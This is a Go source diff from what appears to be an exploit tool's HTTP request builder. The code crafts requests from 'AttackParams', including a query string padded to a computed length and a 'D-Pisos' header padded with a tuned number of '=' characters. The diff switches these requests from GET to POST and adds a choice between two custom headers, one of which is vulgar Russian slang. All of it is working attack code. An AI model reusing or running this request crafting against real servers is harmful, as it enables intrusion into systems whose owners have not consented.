@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/tls"
 	"fmt"
 	"io/ioutil"
@@ -15,6 +16,13 @@ type Requester struct {
 	u      *url.URL
 	cookie string
 }
+
+type HeaderType int
+
+const (
+	HdrEbutMamku HeaderType = iota
+	HdrIOnaNeProtiv
+)
 
 func NewRequester(resource, cookie string) (*Requester, error) {
 	u, err := url.Parse(resource)
@@ -45,10 +53,10 @@ func NewRequester(resource, cookie string) (*Requester, error) {
 }
 
 func (r *Requester) Request(pathInfo string, params *AttackParams) (*http.Response, []byte, error) {
-	return r.RequestWithQueryStringPrefix(pathInfo, params, "")
+	return r.RequestEx(pathInfo, params, "", HdrEbutMamku)
 }
 
-func (r *Requester) RequestWithQueryStringPrefix(pathInfo string, params *AttackParams, prefix string) (*http.Response, []byte, error) {
+func (r *Requester) RequestEx(pathInfo string, params *AttackParams, prefix string, header HeaderType) (*http.Response, []byte, error) {
 	if !strings.HasPrefix(pathInfo, "/") {
 		return nil, nil, fmt.Errorf("path doesn't start with slash: %#v", pathInfo)
 	}
@@ -63,7 +71,8 @@ func (r *Requester) RequestWithQueryStringPrefix(pathInfo string, params *Attack
 		return nil, nil, fmt.Errorf("qsl value too small: qsl=%v, qslDelta=%v, prefix=%#v", params.QueryStringLength, qslDelta, prefix)
 	}
 	u.RawQuery = prefix + strings.Repeat("Q", qslPrime)
-	req, err := http.NewRequest("GET", u.String(), nil)
+	body := bytes.NewBuffer([]byte("el=da"))
+	req, err := http.NewRequest("POST", u.String(), body)
 	if err != nil {
 		return nil, nil, err
 	}
@@ -71,8 +80,15 @@ func (r *Requester) RequestWithQueryStringPrefix(pathInfo string, params *Attack
 	if r.cookie != "" {
 		req.Header.Set("Cookie", r.cookie)
 	}
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("D-Pisos", "8"+strings.Repeat("=", params.PisosLength)+"D")
-	req.Header.Set("Ebut", "mamku tvoyu")
+	switch header {
+	case HdrEbutMamku:
+		req.Header.Set("Ebut", "mamku tvoyu")
+	case HdrIOnaNeProtiv:
+		req.Header.Set("I-Ona-Protiv", "net")
+	}
+
 	resp, err := r.cl.Do(req)
 	if resp != nil {
 		defer func() { _ = resp.Body.Close() }()
